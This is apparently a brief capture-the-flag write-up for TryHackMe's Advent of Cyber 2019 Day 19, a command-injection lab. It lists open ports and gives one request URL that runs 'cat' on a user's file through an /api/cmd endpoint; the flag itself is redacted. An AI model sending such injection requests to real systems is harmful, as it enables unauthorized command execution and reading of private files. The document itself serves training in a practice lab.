---
title: "TryHackMe Advent of Cyber 2019 Day 19"
date: 2019-12-19
layout: post
platform: "TryHackMe"
writeup_type: "seasonal"
series: "Advent of Cyber 2019"
event_day: "Day 19"
permalink: "/writeups/advent-of-cyber/adventofcyber-2019-day-19/"
tags:
  - tryhackme
  - seasonal
  - advent-of-cyber-2019
  - day-19
---

# Christmas Command Injection

```text
nmap
22
3000
111
```

```text
http://10.10.142.20:3000/api/cmd/cat%20%2Fhome%2Fbestadmin%2Fuser.txt
```

## Task

- What are the contents of the user.txt file?
```text
[redacted challenge flag]
```
